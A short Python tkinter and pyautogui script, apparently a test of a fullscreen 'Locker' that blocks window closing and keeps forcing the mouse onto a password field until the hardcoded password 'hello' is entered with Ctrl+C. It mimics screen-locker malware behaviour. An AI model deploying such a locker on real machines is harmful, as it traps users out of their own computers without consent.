from logging import root
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


def callback(event):
    global k, entry
    if entry.get() == 'hello':
        k = True


def on_closing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes('-fullscreen', True)
    root.protocol('WM_DELETE_WINDOW', on_closing)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)


root = Tk()
root.title("Locker")
root.attributes('-fullscreen', True)
entry = Entry(root, font=1 )
entry.place(width=150, height=50, x=600, y=400)
Label0 = Label(root, text='Locker_test', font=1)
Label0.grid(row=0, column=0)
Label1 = Label(root, text='Type password and press ctrl+c', font=3)
Label1.place(x=470, y=300)
root.update()
# root.sleep(0.2)
click(675, 420)
k = False


while k != True:
    on_closing()


